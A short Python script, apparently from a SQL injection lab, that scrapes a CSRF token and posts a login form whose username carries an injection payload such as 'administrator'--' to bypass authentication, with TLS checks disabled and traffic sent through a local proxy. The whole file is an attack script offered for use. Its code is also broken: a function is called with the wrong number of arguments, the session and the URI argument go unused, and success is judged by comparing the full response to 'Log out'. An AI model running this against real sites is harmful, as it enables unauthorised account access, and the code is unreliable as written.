import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8087', 'https':'https://127.0.0.1:8087'}

def get_csrf(s, url) :
    response = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf = soup.find('input')['value']
    return csrf

def exploit_sqli(s, url, uri, payload):
    csrf = get_csrf(url)
    data = {
        "csrf": csrf,
        "username": payload,
        "password" : "faketext"
    }
    res = requests.post(url, data, verify=False, proxies=proxies)
    if res.text == "Log out" :
        return True
    else :
        return False


if __name__ == "__main__" :
    try:
        url = sys.argv[1].strip()
        uri = sys.argv[2].strip()
        payload = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage %s <url> <uri> <payload>" % sys.argv[0].strip())
        print("[-] Example : %s www.example.com \"/login\" \"administrator'--\"" % sys.argv[0].strip())
        
    s = requests.Session()
    
    if exploit_sqli(s, url, uri, payload) :
        print("[+] SQL exploit success")
    else:
        print("[-] SQL exploit fail")
    